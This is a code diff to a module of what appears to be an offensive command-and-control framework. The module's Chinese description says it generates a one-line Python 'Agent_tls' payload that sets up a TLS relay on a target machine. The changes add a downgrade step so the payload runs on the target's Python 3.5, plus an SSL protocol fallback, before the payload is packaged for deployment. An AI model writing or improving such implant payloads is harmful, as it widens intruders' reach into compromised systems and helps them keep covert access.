@@ -10,6 +10,7 @@ import secrets
 from server.core.bootstrap import deploy_command
 from server.s_modules import tls_util
 from server.transports.agent_base import relay_code
+from server.core.pycompat import downgrade_py35
 
 MODULE = {
     "desc": "生成 Agent_tls 一句话 python 载荷(TLS 单向中继)",
@@ -33,7 +34,7 @@ def TL(c):
  cf=_t.NamedTemporaryFile(delete=False,suffix=".pem");cf.write(_CERT.encode());cf.close()
  kf=_t.NamedTemporaryFile(delete=False,suffix=".pem");kf.write(_KEY.encode());kf.close()
  try:
-  ctx=_g.SSLContext(_g.PROTOCOL_TLS_SERVER)
+  ctx=_g.SSLContext(getattr(_g,"PROTOCOL_TLS_SERVER",_g.PROTOCOL_SSLv23))
   ctx.load_cert_chain(cf.name,kf.name)
   return ctx.wrap_socket(c,server_side=True)
  finally:
@@ -110,6 +111,7 @@ def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
     code += _LISTEN_CODE.replace("_CERT", repr(cert["cert_pem"])) \
                         .replace("_KEY", repr(cert["key_pem"])) \
                         .replace("_LP", str(listen_port))
+    code = downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
     compile(code, "<agent_tls>", "exec")  # 生成即校验
 
     command = deploy_command(code)
